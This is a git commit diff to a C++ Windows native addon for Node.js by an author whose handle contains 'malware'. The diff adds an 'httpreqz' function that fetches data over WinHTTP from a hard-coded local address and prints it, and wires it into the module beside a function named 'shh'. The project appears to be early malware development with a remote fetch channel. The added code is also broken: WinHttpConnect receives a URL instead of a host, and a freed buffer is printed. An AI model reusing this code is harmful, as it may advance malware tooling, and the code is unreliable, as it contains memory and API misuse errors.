74239b57077ff9a520e088c82da581bf0598b421
malinois <malinois2malware>
2020-10-18 09:32:56 -0400

    commit

--- src/main.cpp
+++ src/main.cpp
@@ -3,7 +3,7 @@
 #include <Windows.h>
 #include <Winuser.h>
 #include <tlhelp32.h>
-
+#include "httpreq.h"
 //#include "stdafx.h"
 
 napi_value print (napi_env env, napi_callback_info info) {
@@ -65,6 +65,8 @@ napi_value msgbox (napi_env env, napi_callback_info info) {
 }
 
 napi_value shh (napi_env env, napi_callback_info info) {
+  LPCSTR dd=req(L"");
+  printf("%s",dd);
   napi_value argv[1];
   size_t argc = 1;
 
@@ -108,17 +110,118 @@ napi_value shh (napi_env env, napi_callback_info info) {
 
   return NULL;
 }
+napi_value httpreqz (napi_env env, napi_callback_info info) {
+  napi_value argv[1];
+  size_t argc = 1;
+
+  napi_get_cb_info(env, info, &argc, argv, NULL, NULL);
+DWORD dwSize = 0;
+  DWORD dwDownloaded = 0;
+  LPSTR pszOutBuffer;
+  BOOL  bResults = FALSE;
+  HINTERNET  hSession = NULL, 
+             hConnect = NULL,
+             hRequest = NULL;
+
+  // Use WinHttpOpen to obtain a session handle.
+  hSession = WinHttpOpen( L"WinHTTP Example/1.0",  
+                          WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+                          WINHTTP_NO_PROXY_NAME, 
+                          WINHTTP_NO_PROXY_BYPASS, 0 );
+
+  // Specify an HTTP server.
+  if( hSession )
+    hConnect = WinHttpConnect( hSession, L"http://192.168.1.143:8000/ll",
+                               INTERNET_DEFAULT_HTTPS_PORT, 0 );
+
+  // Create an HTTP request handle.
+  if( hConnect )
+    hRequest = WinHttpOpenRequest( hConnect, L"GET", NULL,
+                                   NULL, WINHTTP_NO_REFERER, 
+                                   WINHTTP_DEFAULT_ACCEPT_TYPES, 
+                                   WINHTTP_FLAG_SECURE );
+
+  // Send a request.
+  if( hRequest )
+    bResults = WinHttpSendRequest( hRequest,
+                                   WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+                                   WINHTTP_NO_REQUEST_DATA, 0, 
+                                   0, 0 );
+
+
+  // End the request.
+  if( bResults )
+    bResults = WinHttpReceiveResponse( hRequest, NULL );
+
+  // Keep checking for data until there is nothing left.
+  if( bResults )
+  {
+    do 
+    {
+      // Check for available data.
+      dwSize = 0;
+      if( !WinHttpQueryDataAvailable( hRequest, &dwSize ) )
+        printf( "Error %u in WinHttpQueryDataAvailable.\n",
+                GetLastError( ) );
+
+      // Allocate space for the buffer.
+      pszOutBuffer = new char[dwSize+1];
+      if( !pszOutBuffer )
+      {
+        printf( "Out of memory\n" );
+        dwSize=0;
+      }
+      else
+      {
+        // Read the data.
+        ZeroMemory( pszOutBuffer, dwSize+1 );
+
+        if( !WinHttpReadData( hRequest, (LPVOID)pszOutBuffer, 
+                              dwSize, &dwDownloaded ) )
+          printf( "Error %u in WinHttpReadData.\n", GetLastError( ) );
+        else
+          printf( "%s", pszOutBuffer );
+
+        // Free the memory allocated to the buffer.
+        delete [] pszOutBuffer;
+      }
+    } while( dwSize > 0 );
+  }
+  printf("%s", pszOutBuffer);
+
+  // Report any errors.
+  if( !bResults )
+    printf( "Error %d has occurred.\n", GetLastError( ) );
+
+  // Close any open handles.
+  if( hRequest ) WinHttpCloseHandle( hRequest );
+  if( hConnect ) WinHttpCloseHandle( hConnect );
+  if( hSession ) WinHttpCloseHandle( hSession );
+return NULL;
+}
+
+
+
+
+
+
+
+
 
 napi_value init_all (napi_env env, napi_value exports) {
   napi_value print_fn;
   napi_value msgbox_fn;
   napi_value shh_fn;
+  napi_value httpreqz_fn;
+
   napi_create_function(env, NULL, 0, print, NULL, &print_fn);
   napi_set_named_property(env, exports, "print", print_fn);
   napi_create_function(env, NULL, 0, msgbox, NULL, &msgbox_fn);
   napi_set_named_property(env, exports, "msgbox", msgbox_fn);
   napi_create_function(env, NULL, 0, shh, NULL, &shh_fn);
   napi_set_named_property(env, exports, "shh", shh_fn);
+  napi_create_function(env, NULL, 0, httpreqz, NULL, &httpreqz_fn);
+  napi_set_named_property(env, exports, "httpreqz", httpreqz_fn);
   return exports;
 }
 
